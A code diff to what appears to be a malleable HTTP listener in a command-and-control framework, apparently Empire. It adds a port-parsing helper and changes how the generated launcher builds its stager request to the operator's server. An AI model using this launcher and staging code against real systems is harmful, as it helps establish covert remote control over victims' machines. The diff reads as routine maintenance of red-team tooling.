@@ -273,6 +273,12 @@ class Listener:
 
         return True, None
 
+    def get_malleable_port(self, listenerOptions):
+        try:
+            return listenerOptions["Host"]["Value"].split(":")[2]
+        except IndexError:
+            return listenerOptions["Port"]["Value"]
+
     def generate_launcher(
         self,
         encode=True,
@@ -300,7 +306,7 @@ class Listener:
         # extract the set options for this instantiated listener
         listenerOptions = active_listener.options
 
-        port = listenerOptions["Port"]["Value"]
+        port = self.get_malleable_port(listenerOptions)
         host = listenerOptions["Host"]["Value"]
         launcher = listenerOptions["Launcher"]["Value"]
         stagingKey = listenerOptions["StagingKey"]["Value"]
@@ -532,7 +538,7 @@ class Listener:
 
             # ==== BUILD REQUEST ====
             launcherBase += "vreq=type('vreq',(urllib.request.Request,object),{'get_method':lambda self:self.verb if (hasattr(self,'verb') and self.verb) else urllib.request.Request.get_method(self)})\n"
-            launcherBase += f"req=vreq('{profile.stager.client.url}', {profile.stager.client.body})\n"
+            launcherBase += f"req=vreq(server+'{profile.stager.client.path + profile.stager.client.query}', {profile.stager.client.body})\n"
             launcherBase += "req.verb='" + profile.stager.client.verb + "'\n"
 
             # ==== ADD HEADERS ====
@@ -602,8 +608,8 @@ class Listener:
             return None
 
         # extract the set options for this instantiated listener
-        port = listenerOptions["Port"]["Value"]
         host = listenerOptions["Host"]["Value"]
+        port = self.get_malleable_port(listenerOptions)
         stagingKey = listenerOptions["StagingKey"]["Value"]
         workingHours = listenerOptions["WorkingHours"]["Value"]
         killDate = listenerOptions["KillDate"]["Value"]
